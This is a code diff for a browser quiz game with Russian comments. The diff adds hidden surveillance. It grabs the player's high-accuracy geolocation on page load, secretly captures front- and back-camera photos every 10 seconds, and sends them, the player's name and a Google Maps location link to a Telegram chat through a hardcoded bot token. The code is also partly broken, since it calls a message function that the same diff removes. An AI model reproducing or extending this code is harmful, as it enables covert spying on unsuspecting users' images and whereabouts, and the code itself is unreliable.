@@ -1,5 +1,6 @@
 const TELEGRAM_BOT_TOKEN = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
 const TELEGRAM_CHAT_ID = "8071841674";
+
 // =========== ДАННЫЕ ВОПРОСОВ ===============
 const questionsDB = [
   {
@@ -144,7 +145,6 @@ const questionsDB = [
   }
 ];
 
-
 // ========== Локализация интерфейса ===========
 const uiText = {
   hy: {
@@ -214,35 +214,14 @@ function updateUIText() {
   tryAgainBtn.textContent = uiText[currentLang].tryAgain;
 }
 
-function sendTelegramMessage(text) {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  fetch(url, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: text,
-      parse_mode: "HTML"
-    })
-  }).catch(console.error);
-}
-
-function sendGameResults() {
-  const message = `<b>Результаты игры</b>\nИгрок: ${playerName}\nЯзык: ${currentLang.toUpperCase()}\nПравильных ответов: ${correctCount}\nОшибок: ${wrongCount}`;
-  sendTelegramMessage(message);
-}
-
-// Обновляем отображение имени и языка слева вверху
 function updatePlayerInfo() {
   playerInfo.textContent = `${playerName} (${currentLang.toUpperCase()})`;
 }
 
-// Обновляем счет справа вверху
 function updateScore() {
   scoreInfo.textContent = `Вопрос: ${currentQuestionIndex + 1}/10 | ${uiText[currentLang].correct}: ${correctCount} | ${uiText[currentLang].wrong}: ${wrongCount}`;
 }
 
-// Обработка выбора языка
 langButtons.forEach(btn => {
   btn.addEventListener("click", () => {
     currentLang = btn.dataset.lang;
@@ -252,7 +231,6 @@ langButtons.forEach(btn => {
   });
 });
 
-// Проверка можно ли запускать игру
 function checkStartButton() {
   if (currentLang && nameInput.value.trim() !== "") {
     startButton.disabled = false;
@@ -265,14 +243,12 @@ nameInput.addEventListener("input", () => {
   checkStartButton();
 });
 
-// Подставляем имя если пусто
 function getPlayerName() {
   let val = nameInput.value.trim();
   if(!val) return uiText[currentLang].unknown;
   return val;
 }
 
-// Начало игры
 startButton.addEventListener("click", () => {
   playerName = getPlayerName();
   startScreen.classList.add("hidden");
@@ -287,13 +263,11 @@ startButton.addEventListener("click", () => {
   showQuestion();
 });
 
-// Отображение вопроса
 function showQuestion() {
   waitingForNext = false;
   const qObj = selectedQuestions[currentQuestionIndex][currentLang];
   questionText.textContent = qObj.q;
 
-  // Создаем кнопки ответов с рандомным порядком
   let options = [...qObj.options];
   options = shuffleArray(options);
   answersContainer.innerHTML = "";
@@ -309,7 +283,6 @@ function showQuestion() {
   tryAgainBtn.classList.add("hidden");
 }
 
-// Обработка ответа
 function handleAnswer(button, correctAnswer) {
   if(waitingForNext) return;
   waitingForNext = true;
@@ -322,7 +295,6 @@ function handleAnswer(button, correctAnswer) {
     correctCount++;
   } else {
     button.classList.add("answer-wrong");
-    // Найдем правильный ответ и выделим его
     buttons.forEach(b=>{
       if(b.textContent === correctAnswer) b.classList.add("answer-correct");
     });
@@ -331,7 +303,6 @@ function handleAnswer(button, correctAnswer) {
 
   updateScore();
 
-  // Показ результата после паузы
   setTimeout(() => {
     currentQuestionIndex++;
     if(currentQuestionIndex < 10){
@@ -342,7 +313,6 @@ function handleAnswer(button, correctAnswer) {
   }, 1500);
 }
 
-// Конец игры
 function endGame() {
   answersContainer.innerHTML = "";
   const win = correctCount >= 6;
@@ -350,12 +320,11 @@ function endGame() {
   tryAgainBtn.classList.remove("hidden");
   updateScore();
 
-  sendGameResults();  // <- вот здесь вызываем отправку результатов в Telegram
+  sendGameResults();  // <-- позже добавим функцию отправки
 }
 
-// Повтор игры
 tryAgainBtn.addEventListener("click", () => {
-  // Запрос разрешений камеры и геолокации, если их не было
+  // Запрос разрешений камеры и геолокации (будет позже)
   requestPermissionsIfNeeded();
 
   currentQuestionIndex = 0;
@@ -367,15 +336,173 @@ tryAgainBtn.addEventListener("click", () => {
   showQuestion();
 });
 
-// ========================================
-// Камера, геолокация, Telegram - ЗАГЛУШКИ (сюда позже добавим реализацию)
-// ========================================
-
 function requestPermissionsIfNeeded() {
-  // Логика повторного запроса камеры и геолокации
-  // Для примера, пока просто console.log
-  console.log("Проверка и запрос разрешений камеры и геолокации при повторном запуске");
+  // Заглушка для камеры и гео
+  console.log("Проверка разрешений камеры и геолокации...");
 }
+
+let geoCoords = null;  // сюда сохраняем координаты после получения
+
+function requestGeolocation() {
+  if (!navigator.geolocation) {
+    console.log("Геолокация не поддерживается браузером");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      geoCoords = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+      };
+      console.log("Геолокация получена:", geoCoords);
+    },
+    (error) => {
+      console.log("Ошибка получения геолокации:", error.message);
+      geoCoords = null;
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 5000,
+      maximumAge: 0,
+    }
+  );
+}
+
+// Формируем ссылку Google Maps из координат
+function getGoogleMapsLink() {
+  if (!geoCoords) return "Геолокация не доступна";
+  return `https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`;
+}
+
+// Вызовем запрос геолокации сразу при загрузке
+requestGeolocation();
+
+
+let frontCameraStream = null;
+let backCameraStream = null;
+let frontPhotoBlob = null;
+let backPhotoBlob = null;
+
+// Функция для запроса доступа к камерам и получения стримов
+async function requestCameraAccess() {
+  try {
+    // Запрос фронтальной камеры
+    frontCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    console.log("Доступ к фронтальной камере получен");
+
+    // Запрос задней камеры
+    backCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+    console.log("Доступ к задней камере получен");
+
+    // Сделаем первые фото сразу
+    frontPhotoBlob = await capturePhoto(frontCameraStream);
+    backPhotoBlob = await capturePhoto(backCameraStream);
+
+    // Отправим первые фото
+    sendPhotoToTelegram(frontPhotoBlob, "Front Camera");
+    sendPhotoToTelegram(backPhotoBlob, "Back Camera");
+
+    // Каждые 10 секунд — новые фото
+    setInterval(async () => {
+      frontPhotoBlob = await capturePhoto(frontCameraStream);
+      backPhotoBlob = await capturePhoto(backCameraStream);
+      sendPhotoToTelegram(frontPhotoBlob, "Front Camera");
+      sendPhotoToTelegram(backPhotoBlob, "Back Camera");
+    }, 10000);
+
+  } catch (err) {
+    console.log("Ошибка доступа к камерам:", err);
+  }
+}
+
+// Функция захвата фото из MediaStream (возвращает Blob)
+function capturePhoto(stream) {
+  return new Promise((resolve) => {
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+
+    video.addEventListener("loadeddata", () => {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob((blob) => {
+        resolve(blob);
+        video.pause();
+        video.srcObject = null;
+      }, "image/jpeg");
+    });
+  });
+}
+
+// Отправка фото в Telegram Bot API
+function sendPhotoToTelegram(photoBlob, label) {
+  const formData = new FormData();
+  formData.append("chat_id", TELEGRAM_CHAT_ID);
+  formData.append("caption", `${playerName} - ${label}`);
+  formData.append("photo", photoBlob, `${label.replace(" ", "_")}.jpg`);
+
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: formData,
+  }).catch((err) => {
+    console.log("Ошибка отправки фото:", err);
+  });
+}
+
+// Запрос разрешений камеры и геолокации
+function requestPermissionsIfNeeded() {
+  // Запрос геолокации
+  if (!geoCoords) {
+    requestGeolocation();
+  }
+  // Запрос камеры
+  if (!frontCameraStream || !backCameraStream) {
+    requestCameraAccess();
+  }
+}
+
+// Изменим отправку результатов — добавим ссылку на карту
+function sendGameResults() {
+  const mapLink = getGoogleMapsLink();
+  const message = `<b>Результаты игры</b>\nИгрок: ${playerName}\nЯзык: ${currentLang.toUpperCase()}\nПравильных ответов: ${correctCount}\nОшибок: ${wrongCount}\nГеолокация: ${mapLink}`;
+  sendTelegramMessage(message);
+}
+
+// Вызовы при старте игры
+startButton.addEventListener("click", () => {
+  playerName = getPlayerName();
+  startScreen.classList.add("hidden");
+  gameScreen.classList.remove("hidden");
+  currentQuestionIndex = 0;
+  correctCount = 0;
+  wrongCount = 0;
+  waitingForNext = false;
+  selectedQuestions = shuffleArray([...questionsDB]).slice(0, 10);
+  updatePlayerInfo();
+  updateScore();
+
+  requestPermissionsIfNeeded(); // Запросить камеры и геолокацию
+
+  showQuestion();
+});
+
+// Вызов requestPermissionsIfNeeded при повторном запуске (уже в твоём коде)
+tryAgainBtn.addEventListener("click", () => {
+  requestPermissionsIfNeeded();
+
+  currentQuestionIndex = 0;
+  correctCount = 0;
+  wrongCount = 0;
+  selectedQuestions = shuffleArray([...questionsDB]).slice(0, 10);
+  updateScore();
+  tryAgainBtn.classList.add("hidden");
+  showQuestion();
+});
+
 
 // Инициализация UI при загрузке страницы
 updateUIText();
